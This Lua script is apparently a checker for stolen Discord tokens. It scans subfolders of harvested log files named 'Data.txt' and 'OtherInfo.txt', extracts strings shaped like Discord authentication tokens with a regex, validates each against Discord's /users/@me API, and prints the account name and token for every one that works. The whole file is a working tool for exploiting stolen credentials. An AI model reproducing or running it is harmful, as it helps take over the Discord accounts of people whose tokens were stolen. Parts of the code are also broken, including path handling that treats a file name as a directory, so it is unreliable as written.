local Https = require("coro-http")
local Json = require("json")
local fs = require("fs")
local Path = "Tokens.txt"

local function readFile(FileName)
    local File = io.open(FileName, "r")
    if not File then
        return nil
    end
    local Content = File:read("*a")
    File:close()
    return Content
end

local function VerifyToken(Token)
    local H,Body = Https.request("GET","https://discordapp.com/api/v8/users/@me",{{"Authorization",Token}})
    local JsonDecode = Json.decode(Body)
    if H.code == 200 then
        return JsonDecode["username"] .. "#" .. JsonDecode["discriminator"]
    end
    return false
end

coroutine.wrap(function()
    for _,FolderN in pairs(fs.readdirSync(Path)) do
        if FolderN ~= "DontScan" then
            for _,File in pairs(fs.readdirSync(Path.."\\"..FolderN)) do
                if File == "Data.txt" or File == "OtherInfo.txt" then
                    local Data = readFile(Path..FolderN.."\\"..File)
                    if Data then
                        local Found = Data:match("[%w-_]+[.][%w-_]+[.][%w-_]+") or Data:match("mfa[.][%w-_]+")
                        if type(Found) == "string" and string.len(Found) > 11 then -- fuck proper pattern matching lol
                            local User = VerifyToken(Found)
                            if User then
                                print(User.." "..Found)
                            end
                        end
                    end
                end
            end
        end
    end
end)()
